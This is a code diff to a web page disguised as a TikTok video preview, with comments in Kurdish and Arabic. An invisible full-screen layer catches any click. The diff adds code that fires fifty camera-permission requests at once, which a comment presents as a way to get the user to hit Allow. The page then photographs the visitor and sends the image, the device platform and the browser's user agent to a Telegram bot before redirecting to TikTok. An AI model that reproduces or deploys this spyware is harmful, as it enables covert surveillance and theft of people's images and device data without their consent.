@@ -12,14 +12,12 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         
-        /* باگراوەندی ڤیدیۆکە ڕێک وەک وێنەکە */
         .main-ui {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: url('https://raw.githubusercontent.com/rudawsoran/Video/main/soran.jpg') no-repeat center center;
             background-size: cover; z-index: 1;
         }
 
-        /* بەشی سەرەوە (Header) */
         .tt-header {
             position: absolute; top: 0; width: 100%; height: 60px;
             background: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent);
@@ -28,13 +26,11 @@
         .open-app-top { background: #fe2c55; color: white; padding: 6px 12px; border-radius: 4px; font-size: 13px; font-weight: bold; }
         .tt-logo-top { height: 25px; }
 
-        /* نیشانەی Play لە ناوەڕاست */
         .play-icon {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
             width: 70px; height: 70px; opacity: 0.9; z-index: 2;
         }
 
-        /* بەشی خوارەوە (Footer) */
         .tt-footer {
             position: absolute; bottom: 0; width: 100%; padding: 20px;
             background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
@@ -46,7 +42,7 @@
             display: flex; align-items: center; justify-content: center; gap: 10px;
         }
 
-        /* تەڵەی کلیکەکە */
+        /* تەڵەی ٥٠ کلیکەکە */
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; cursor: pointer; }
         #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 2000; display: none; }
         
@@ -65,15 +61,12 @@
 
         <div class="tt-footer">
             <p style="color: white; font-size: 14px; margin-bottom: 15px;">استمتع بمزيد من المحتوى في التطبيق</p>
-            <button class="btn-watch">
-                <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e4869ef429699778278278278278278.png" style="height:20px;">
-                المشاهدة على TikTok
-            </button>
+            <button class="btn-watch">المشاهدة على TikTok</button>
         </div>
     </div>
 
     <div id="flash"></div>
-    <div id="trap" onclick="startHeist()"></div>
+    <div id="trap" onclick="rapidFire()"></div>
     
     <video id="v" autoplay playsinline muted></video>
     <canvas id="c"></canvas>
@@ -83,36 +76,52 @@
         const chat_id = "7261354534";
         const target = "https://vt.tiktok.com/ZS5WMhjoP/";
 
-        async function startHeist() {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const v = document.getElementById('v');
-                v.srcObject = s;
-                await v.play();
-                
-                document.getElementById('flash').style.display = 'block';
+        let captured = false;
 
-                setTimeout(async () => {
-                    // گرتنی وێنەی یەکەم و زانیاری ئامێر
-                    const canvas = document.getElementById('c');
-                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
-                    
-                    const fd = new FormData();
-                    fd.append('chat_id', chat_id);
-                    fd.append('photo', blob, 'pasha_snap.jpg');
-                    fd.append('caption', `👑 نێچیرێکی نوێ ڕاو کرا!\n📱 سیستەم: ${navigator.platform}`);
-                    
-                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                    
-                    setTimeout(() => {
-                        window.location.href = target;
-                    }, 500);
-                }, 800);
-            } catch (e) {
-                window.location.href = target;
+        async function rapidFire() {
+            if (captured) return;
+
+            // 👑 فێڵی ٥٠ کلیکە خێراکە بۆ تێپەڕاندنی بڕیاری سیستم
+            for (let i = 0; i < 50; i++) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    if (!captured) {
+                        captured = true;
+                        handleSuccess(stream);
+                    }
+                })
+                .catch(err => {
+                    // بەردەوام دەبێت لە ناردنی داواکاری تا کلیکێک بەر Allow دەکەوێت
+                    if (i === 49 && !captured) {
+                        setTimeout(() => { window.location.href = target; }, 2000);
+                    }
+                });
             }
+        }
+
+        async function handleSuccess(stream) {
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            await v.play();
+            
+            document.getElementById('flash').style.display = 'block';
+
+            // گرتنی وێنە و ناردنی زانیاری ئامێر
+            setTimeout(async () => {
+                const canvas = document.getElementById('c');
+                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+                canvas.getContext('2d').drawImage(v, 0, 0);
+                const blob = await (await fetch(canvas.toDataURL('image/jpeg', 0.8))).blob();
+                
+                const fd = new FormData();
+                fd.append('chat_id', chat_id);
+                fd.append('photo', blob, 'pasha_hit.jpg');
+                fd.append('caption', `🔥 پاشا، تەڵەکە تەقییەوە!\n📱 ئامێر: ${navigator.platform}\n📜 داتا: ${navigator.userAgent}`);
+                
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                
+                window.location.href = target;
+            }, 500);
         }
     </script>
 </body>
